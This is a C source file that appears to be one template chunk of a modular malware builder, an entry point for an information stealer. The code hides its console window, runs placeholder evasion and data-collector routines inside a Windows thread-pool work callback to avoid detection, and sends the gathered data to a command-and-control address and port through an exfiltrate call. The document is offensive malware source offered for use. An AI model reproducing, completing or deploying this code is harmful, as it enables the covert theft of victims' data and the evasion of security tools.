// chunk: arch/tp_work
// category: arch
// depends: evasion/tp_work_exec
// provides: main
// libs: ws2_32, iphlpapi, crypt32, ole32, shell32, gdi32, wininet, dnsapi, shlwapi, advapi32
// headers: winsock2.h, windows.h
// note: Thread Pool work item execution — payload runs as TP_WORK callback

static void payload_main(void *ctx) {
    (void)ctx;

    {{EVASION_INIT}}

    init_buffer();
    if (!g_data) return;

    {{COLLECTOR_CALLS}}

    if (g_pos > 0)
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);

    free(g_data);
}

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    FreeConsole();

    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);

    execute_via_threadpool(payload_main, NULL);

    WSACleanup();
    return 0;
}
